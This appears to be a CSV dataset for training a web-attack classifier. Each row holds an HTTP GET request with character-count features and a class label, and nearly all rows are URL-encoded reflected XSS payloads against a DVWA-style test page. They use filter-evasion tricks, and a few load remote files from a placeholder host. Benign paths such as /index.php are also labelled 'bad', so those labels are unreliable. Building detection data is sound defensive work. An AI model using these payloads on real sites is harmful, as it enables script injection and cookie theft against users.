method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3Dhttp%3A%2F%2Ffoo.bar%2F%23x%3D%60y%3E%3C%2Fa%3E%3Cimg+alt%3D%22%60%3E%3Cimg+src%3Dx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E%3C%2Fa%3E%22%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E,,2,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3C%3Fa+foo%3Dx%3D%60y%3E%3Cimg+alt%3D%22%60%3E%3Cimg+src%3Dx%3Ax+onerror%3Dalert%283%29%2F%2F%22%3E,,0,2,0,1,4,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%23alert%281%29%3B%22%3E,,0,2,0,1,1,5,bad
GET,/index.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%257D%253C%2Fstyle%253E43%2527%2522%253E%253C%2Ftitle%253E%253Cscript%253Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FKCF%2F.source%29%29%3B%253C%2Fscript%253E%2527%2522%253E%253Cmarquee%253E%253Ch1%253EKCF%253C%2Fh1%253E%253C%2Fmarquee%253E,,0,0,0,2,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3Capplet+onerror+applet+onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fapplet+onerror%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%26%23127%3Boo%2F%3Bcolor%3Ared%2F*%2Ffoo.jpg%29%3B%22%3EX,,0,2,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onMouseMove+body+onMouseMove%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onMouseMove%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2507cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2511javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%2588expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D1+name%3Dx%3Ekcf%3C%2Fa%3E%3Ca+href%3D1+name%3Dx%3Ekcf%3C%2Fa%3E%3Cscript%3Ealert%28x.removeChild%29%2F%2Fundefinedalert%28x.parentNode%29%2F%2Fundefined%3C%2Fscript%3E,,0,0,0,2,4,8,bad
GET,/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+class%3D%22foo1%22%3Ekcf%3C%2Fdiv%3E+%3Cscript%3Edocument.getElementsByClassName%28%27foo1%27%29%5B0%5D%3Falert%281%29%3A0%3C%2Fscript%3E,,2,2,0,2,2,4,bad
GET,/vulnerabilities/xss_r/?name=--%3E%3C%21--+--%2521%3E+%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,,0,0,4,1,5,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%250Ejavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22invalid%3A1%22+id%3Dx+name%3Dy%3Ekcf%3C%2Fa%3E%3Ca+href%3D%22invalid%3A2%22+id%3Dx+name%3Dy%3Ekcf%3C%2Fa%3E%3Cscript%3Ealert%28x.y%5B0%5D%29%3C%2Fscript%3E,,0,4,0,1,6,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%2584expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/security.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody%2Fonload%3D%3C%21--%3E%26%2310alert%281%29%3E,,0,0,1,1,0,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2518javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%2581expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3Cevent-source+src%3D%22data%3Aapplication%2Fx-dom-event-stream%2CEvent%3Aclick%250Adata%3AKCF%250A%250A%22%3E,,0,4,0,1,2,8,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22binding%3A+url%28%22http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html%22%29%29%3B%22%3E,,0,4,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca%26%2332%3Bhref%26%2361%3B%26%2391%3B%26%2300%3B%26%2393%3B%22%26%2300%3B+onmouseover%3Dprompt%26%2340%3B1%26%2341%3B%26%2347%3B%26%2347%3B%22%3EXYZ%3C%2Fa,,0,2,0,0,1,1,bad
GET,/vulnerabilities/xss_r/?name=%3CBGSOUND+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onPropertyChange+body+onPropertyChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onPropertyChange%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%27%2520onmouseover%3Dalert%281%29%27,,2,0,0,1,0,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E,,0,6,0,0,3,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fbody%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2509cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ccomment%3E%3Cimg+src%3D%22%3C%2Fcomment%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%2F%2F%22%3E,,0,2,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onLoad+body+onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onLoad%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%2580expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22behaviour%3A+url%28%27http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html%27%29%3B%22%3E,,2,2,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX%3C%2Fdiv%3E,,0,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3CBODY+ONLOAD%3Djavascript%3Ajavascript%3Aalert%281%29%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2506cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%251Cjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3Dhttp%3A%2F%2Ffoo.bar%2F%23x%3D%60y%3E%3C%2Fa%3E%3Cimg+alt%3D%22%60%3E%3Cimg+src%3Dx%3Ax+onerror%3Dalert%281%29%3E%3C%2Fa%3E%22%3E,,0,2,0,1,4,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cb%2Falt%3D%221%22onmouseover%3DInputBox%2B1language%3Dvbs%3EKCF%3C%2Fb%3E,,0,2,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22font-family%3A%27foo%5Ba%5D%3Bcolor%3Ared%3B%27%3B%22%3EXXX%3C%2Fdiv%3E,,2,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%2520expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22%5Ba%5Dcolor%5Bb%5D%3A%5Bc%5Dred%22%3EXXX%3C%2Fdiv%3E,,0,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3C%2Fa+onmousemove%3D%22alert%281%29%22%3E,,0,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2510javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22behaviour%3A+url%28http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html%29%3B%22%3E,,0,2,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25C2%25A0expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+style%3D%22-o-link%3A%27javascript%3Ajavascript%3Aalert%281%29%27%3B-o-link-source%3Acurrent%22%3EX,,2,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27KCF%27%29%22%3E,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onactivate%3Dalert%281%29%3E,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%250Djavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x33%26%23x31%26%23x2B%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x33%26%23x31%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x35%26%23x62%26%23x27%26%23x5C%26%23x31%26%23x34%26%23x35%26%23x5C%26%23x31%26%23x36%26%23x36%26%23x5C%26%23x31%26%23x34%26%23x31%26%23x5C%26%23x31%26%23x35%26%23x34%26%23x27%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x35%26%23x64%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x32%26%23x38%26%23x27%26%23x5C%26%23x31%26%23x34%26%23x31%26%23x5C%26%23x31%26%23x35%26%23x34%26%23x5C%26%23x31%26%23x34%26%23x35%26%23x5C%26%23x31%26%23x36%26%23x32%26%23x5C%26%23x31%26%23x36%26%23x34%26%23x5C%26%23x35%26%23x30%26%23x5C%26%23x36%26%23x31%26%23x5C%26%23x35%26%23x31%26%23x27%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x32%26%23x39%22%3Ekcf%3C%2Fa%3E,,0,2,0,0,1,5,bad
GET,/vulnerabilities/xss_r/?name=%26%2313%3B%3Cblink%2F%26%2313%3B+onmouseover%3Dpr%26%23x6F%3Bmp%26%23116%3B%281%29%3EOnMouseOver+%7BFirefox+%26+Opera%7D,,0,0,0,1,4,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3Avoid%280%29%22+onmouseover%3D%26NewLine%3Bjavascript%3Aalert%281%29%26NewLine%3B%3EX%3C%2Fa%3E,,0,2,0,2,2,7,bad
GET,/vulnerabilities/xss_r/?name=%2522%253E%253C%2573%2563%2572%2569%2570%2574%253E%254B%2543%2546%253C%252F%2573%2563%2572%2569%2570%2574%253E,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+style%3D%22behavior%3Aurl%28%23default%23AnchorClick%29%3B%22+folder%3D%22javascript%3Aalert%281%29%22%3EXXX%3C%2Fa%3E,,0,4,0,2,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cbgsound+onPropertyChange+bgsound+onPropertyChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbgsound+onPropertyChange%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%2583expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%281%29%29%22%3E,,0,2,0,2,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onmouseover%3D%28alert%281%29%29%3EKCF%3C%2Fa%3E,,0,0,0,2,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onUnload+body+onUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onUnload%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3A%250031%2B%250031%25005b%27%5C145%5C166%5C141%5C154%27%25005d%250028%27%5C141%5C154%5C145%5C162%5C164%5C50%5C61%5C51%27%250029%22%3Ekcf%3C%2Fa%3E,,4,2,0,0,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2503javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3CBGSOUND+SRC%3D%22javascript%3Aalert%281%29%3B%22%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3D%22x%22%3EKCF%3C%2Fdiv%3E+%3Cstyle%3E++%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D++%23y%5D%3Bcolor%3Ared%3B%7B%7D++%3C%2Fstyle%3E,,0,2,0,0,8,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22background%3Aurl%28http%3A%2F%2Ffoo.f%2Ff+oo%2F%3Bcolor%3Ared%2F*%2Ffoo.jpg%29%3B%22%3EX%3C%2Fdiv%3E,,0,2,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3Capplet+onreadystatechange+applet+onreadystatechange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fapplet+onreadystatechange%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27KCF%27%29%29%22%3E,,2,2,0,2,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onkeyup+body+onkeyup%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onkeyup%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2520javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ccomment%3E%3Cimg+src%3D%22%3C%2Fcomment%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%29%2F%2F%22%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3Dcontent%3Aurl%28%2525%28svg%29s%29%3E%3C%2Fdiv%3E,,0,0,0,2,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2504javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%26%2334%3B%26%2362%3B%3Csvg%3E%3Cstyle%3E%7B-o-link-source%26colon%3B%27%3Cbody%2Fonload%3Dconfirm%281%29%3E%27,,2,0,0,1,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onscroll%3Dalert%281%29%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cinput+autofocus%3E,,0,0,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onmouseover%3Dalert%28document.cookie%29%3Ekcf+link%3C%2Fa%3E,,0,0,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onbeforeunload+body+onbeforeunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onbeforeunload%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2515javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%253Cscript%253Ea%253D%252FKCF%252F,,0,0,0,0,0,1,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2513javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%26colon%3B%250061%26%23x6C%3B%26%23101%2572t%26lpar%3B1%26rpar%3B%22%3E%3Cbutton%3E,,0,2,0,0,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%250A%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%250Dcript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+aa+aaa+aaaa+aaaaa+aaaaaa+aaaaaaa+aaaaaaaa+aaaaaaaaa+aaaaaaaaaa+href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EKCF,,0,0,0,1,10,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Dalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E,,0,2,0,1,4,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22kcf%3Aexpression%28alert%281%29%29%5C%22%3E%3C%2Fdiv%3E,,0,2,0,2,1,3,bad
GET,/vulnerabilities/xss_r/?name=%22%27%60%3E%3C%2500img+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EKCF,,2,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22data%3Atext%2Fhtml%3Bbase64_%2C%3Csvg%2Fonload%3D%250061%26%23x6C%3B%26%23101%2572t%281%29%3E%22%3EX%3C%2Fa,,0,2,0,1,1,1,bad
GET,/vulnerabilities/xss_r/?name=%2526%27%2522%253E%253Cscript%253Ealert%28%252Fkcf%252F%29%253C%252Fscript%253E%253D,,1,0,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput+autofocus%3E,,0,0,0,1,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onkeydown+body+onkeydown%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onkeydown%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3C%21a+foo%3Dx%3D%60y%3E%3Cimg+alt%3D%22%60%3E%3Cimg+src%3Dx%3Ax+onerror%3Dalert%282%29%2F%2F%22%3E,,0,2,0,1,4,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2501javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%251Bjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22123%22+id%3Dx%3Etest%3C%2Fa%3E%3Cscript%3Ex%3D%27javascript%3Aalert%281%29%27%3B%3C%2Fscript%3E,,2,2,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+style%3D%22behavior%3Aurl%28%23default%23AnchorClick%29%3B%22+folder%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EKCF%3C%2Fa%3E,,0,4,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=%2527%253E%253C%2573%2563%2572%2569%2570%2574%253E%254B%2543%2546%253C%252F%2573%2563%2572%2569%2570%2574%253E,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2504cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+src%3D1+onerror%3Dalert%281%29%3E,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexpression%255C%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Capplet+onReadyStateChange+applet+onReadyStateChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fapplet+onReadyStateChange%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2503cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%5Ba%5Doo%2F%3Bcolor%3Ared%2F*%2Ffoo.jpg%29%3B%22%3EX%3C%2Fdiv%3E,,0,2,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%250Aexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv++style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%2525%3Bheight%3A100%2525%22++onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E%E2%80%8B,,0,6,0,2,5,2,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%258Bexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2506javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onBeforeUnload+body+onBeforeUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onBeforeUnload%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22kcf%3Aexpression%28alert%281%29%29%22%3E%3C%2Fdiv%3E,,0,2,0,2,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3Djava%26%231%26%232%26%233%26%234%26%235%26%236%26%237%26%238%26%2311%26%2312script%3Ajavascript%3Aalert%281%29%3EKCF%3C%2Fa%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22kcf%3Aexpression%28alert%281%29%29%22%3Ekcf%2Fdiv%3E,,0,2,0,2,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%251Ajavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22jav%26%2397ascript%3Ajavascript%3Aalert%281%29%22%3Etest1%3C%2Fa%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%5C%27%3E%3Cbody+onload%3D%5C%27KCF%5C%27%3E,,3,0,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%27%60%22%3E%3C%253Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onunload+body+onunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onunload%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2500cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
